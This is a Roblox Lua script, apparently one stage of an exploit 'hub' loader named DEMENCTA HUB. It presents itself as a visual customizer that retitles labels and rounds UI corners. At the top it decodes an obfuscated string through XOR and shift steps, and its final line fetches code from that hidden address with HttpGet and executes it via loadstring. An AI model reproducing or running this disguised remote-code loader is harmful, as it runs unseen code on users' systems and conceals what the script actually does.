
--[[ STAGE 2: VISUAL CORE ]]
local q3UoVLPM7x2_eVOsnddjVR="\082\184\067\007\125\116\114\117\066\106\185\186\184\176\176\163\166\162\184\182\092\091\086\095\075\139\164\155\142\181\156\140\134\249\133\136\254\156\140\188\128\241\134\247\254\238\225\144\240\232\216\232\238\217\226\243\224\202\218\247\136\203\214\208\206\130\195\197\202\050\056\194\058\055\057\246\063\046\045\048\046\040\034\040\025\026\029\222\030\018\024\215\015\011\018\005\001\002\008\123\014\126\114\003\118\125\107\112\112\043\100\112\101\034\036\019\092\093\083\085\091"local ElofEgJhsxFbV1MH=57 local hqJIN3ubRmskUli5o=245 local qntBZn0UbDlu9bdLACg=1 local jcFkdJsxDeWjY=2 local eFz2VSeADPilJ2r9lIF22=19 local b7NI16Jh55yuV8TG=true local X_nJODojOADUsfR8aU=bit32 and bit32.bxor if not X_nJODojOADUsfR8aU then X_nJODojOADUsfR8aU=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local RKdypca1CleDm0gXaD={}for b7tseu23cPhe9PMb97pg=1,#q3UoVLPM7x2_eVOsnddjVR do local STPnoMwph781Dmrq43=string.byte(q3UoVLPM7x2_eVOsnddjVR,b7tseu23cPhe9PMb97pg)local nD85yg8w1FaIDl=(hqJIN3ubRmskUli5o+(b7tseu23cPhe9PMb97pg*jcFkdJsxDeWjY)+eFz2VSeADPilJ2r9lIF22)%256 if qntBZn0UbDlu9bdLACg==0 then STPnoMwph781Dmrq43=(STPnoMwph781Dmrq43-nD85yg8w1FaIDl)%256 RKdypca1CleDm0gXaD[b7tseu23cPhe9PMb97pg]=string.char(X_nJODojOADUsfR8aU(STPnoMwph781Dmrq43,ElofEgJhsxFbV1MH))else STPnoMwph781Dmrq43=X_nJODojOADUsfR8aU(STPnoMwph781Dmrq43,ElofEgJhsxFbV1MH)RKdypca1CleDm0gXaD[b7tseu23cPhe9PMb97pg]=string.char((STPnoMwph781Dmrq43-nD85yg8w1FaIDl)%256)end end local NU2PcApAHTPY=table.concat(RKdypca1CleDm0gXaD)if b7NI16Jh55yuV8TG then NU2PcApAHTPY=string.reverse(NU2PcApAHTPY)end local aKSl0qVFcDS56KwyOuWz=NU2PcApAHTPY
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(aKSl0qVFcDS56KwyOuWz))()
